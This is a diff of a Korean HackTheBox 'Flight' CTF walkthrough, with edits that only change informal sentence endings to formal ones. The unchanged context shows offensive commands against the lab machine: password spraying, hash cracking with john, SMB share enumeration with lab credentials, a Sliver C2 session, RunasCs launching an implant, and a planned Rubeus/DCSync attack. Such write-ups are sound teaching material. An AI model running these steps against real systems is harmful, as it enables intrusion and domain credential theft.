@@ -185,7 +185,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 1614: flight\WebDevs (SidTypeGroup)
 ```
 
-이제 유효한 사용자 이름 목록을 얻었어. `svc_apache` 계정은 Apache 서비스를 실행하기 위해 생성되었으므로, 이 서비스 계정을 만든 사용자가 개인 비밀번호를 재사용했을 가능성이 아주 높다. 우리가 확보한 사용자 이름 목록을 대상으로 비밀번호 스프레이(password spray) 공격을 시도하여 `svc_apache`의 비밀번호가 재사용되었는지 확인할 수 있다.
+이제 유효한 사용자 이름 목록을 얻었다. `svc_apache` 계정은 Apache 서비스를 실행하기 위해 생성되었으므로, 이 서비스 계정을 만든 사용자가 개인 비밀번호를 재사용했을 가능성이 아주 높다. 우리가 확보한 사용자 이름 목록을 대상으로 비밀번호 스프레이(password spray) 공격을 시도하여 `svc_apache`의 비밀번호가 재사용되었는지 확인할 수 있다.
 
 먼저 다음 내용(위의 사용자 목록)을 담은 `users`라는 파일을 생성한다.
 그런 다음 `crackmapexec`를 사용해 비밀번호 스프레이를 실행한다.
@@ -217,7 +217,7 @@ smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'
         Web                                                     READ ONLY
 ```
 
-이제 `Shared` 공유 폴더에 쓰기(WRITE) 권한이 생겼어. `impacket-smbclient`를 사용해 이 공유 안에 무엇이 있는지 확인한다.
+이제 `Shared` 공유 폴더에 쓰기(WRITE) 권한이 생겼다. `impacket-smbclient`를 사용해 이 공유 안에 무엇이 있는지 확인한다.
 
 ```bash
 impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
@@ -300,7 +300,7 @@ impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-해시가 `Tikkycoll_431012284`로 성공적으로 크랙되었어! 다시 한 번 SMB에서 이 사용자로 어떤 새로운 권한을 얻었는지 확인한다.
+해시가 `Tikkycoll_431012284`로 성공적으로 크랙되었다! 다시 한 번 SMB에서 이 사용자로 어떤 새로운 권한을 얻었는지 확인한다.
 
 ```bash
 smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284'
@@ -319,7 +319,7 @@ smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284'
 ```
 
 
-`Web` 공유에 대한 쓰기(WRITE) 권한을 얻었어! 익스플로잇을 진행하기 전에 `Users/C.bum/Desktop` 경로에서 사용자 플래그(user flag)를 먼저 가져오자.
+`Web` 공유에 대한 쓰기(WRITE) 권한을 얻었다! 익스플로잇을 진행하기 전에 `Users/C.bum/Desktop` 경로에서 사용자 플래그(user flag)를 먼저 가져오자.
 (smbclient를 통해 `user.txt` 다운로드 성공)
 
 ---
@@ -403,7 +403,7 @@ sliver (PROTECTIVE_MARBLE) > shell
 PS C:\xampp\htdocs\flight.htb> .\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\htb.exe"
 ```
 
-드디어 `c.bum` 사용자로 새로운 세션을 얻었어! 계속해서 머신을 열거한다.
+드디어 `c.bum` 사용자로 새로운 세션을 얻었다! 계속해서 머신을 열거한다.
 ```bash
 PS C:\Windows\system32> whoami /all
 whoami /all
@@ -499,11 +499,11 @@ sliver (PROTECTIVE_MARBLE) > whoami
 [*] Current Token ID: IIS APPPOOL\DefaultAppPool
 ```
 
-`IIS APPPOOL\DefaultAppPool` 권한으로 새 세션을 얻었어! 이 "사용자"는 사실 Microsoft 가상 계정(Virtual Account)이며, Microsoft의 설명에 따르면 가상 계정으로 실행되는 서비스는 `<domain_name>\<computer_name>$` 형식의 컴퓨터 계정 자격 증명을 사용하여 네트워크 리소스에 접근한다.
+`IIS APPPOOL\DefaultAppPool` 권한으로 새 세션을 얻었다! 이 "사용자"는 사실 Microsoft 가상 계정(Virtual Account)이며, Microsoft의 설명에 따르면 가상 계정으로 실행되는 서비스는 `<domain_name>\<computer_name>$` 형식의 컴퓨터 계정 자격 증명을 사용하여 네트워크 리소스에 접근한다.
 
 https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts
 
-이 말은 현재 세션에서 `Rubeus`를 사용하여 우리 자신(컴퓨터 계정)을 위한 티켓을 요청하고 DCSync 공격을 수행할 수 있다는 뜻이다. sliver와 함께 제공되는 armory에는 Rubeus 모듈이 있어서 익스플로잇을 쉽게 만들어줘.
+이 말은 현재 세션에서 `Rubeus`를 사용하여 우리 자신(컴퓨터 계정)을 위한 티켓을 요청하고 DCSync 공격을 수행할 수 있다는 뜻이다. sliver와 함께 제공되는 armory에는 Rubeus 모듈이 있어서 익스플로잇을 쉽게 만들어준다.
 
 https://github.com/GhostPack/Rubeus
 
